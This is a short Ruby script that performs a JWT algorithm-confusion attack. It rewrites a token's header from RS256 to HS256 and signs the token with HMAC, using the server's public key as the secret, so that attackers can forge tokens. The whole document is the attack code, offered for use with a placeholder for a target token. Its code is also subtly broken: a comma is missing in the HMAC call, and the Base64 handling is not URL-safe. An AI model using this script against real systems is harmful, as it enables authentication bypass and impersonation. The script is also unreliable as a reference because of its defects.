#sign the signature with a public key - usually public.pem format
require 'base64'
require 'openssl'

pub = File.open("public.pem").read

#enter your JWT here
TOKEN = "jwt.payload.here"

header, payload, signature = TOKEN.split"."

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256", "HS256")
puts decoded_header
new_header = Base64.encode64(decoded_header).gsub("=","")

decoded_payload = Base64.decode64(payload)

puts decoded_payload
new_payload = Base64.encode64(decoded_payload).gsub("=","")

data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256")pub, data))

puts data+"."+signature
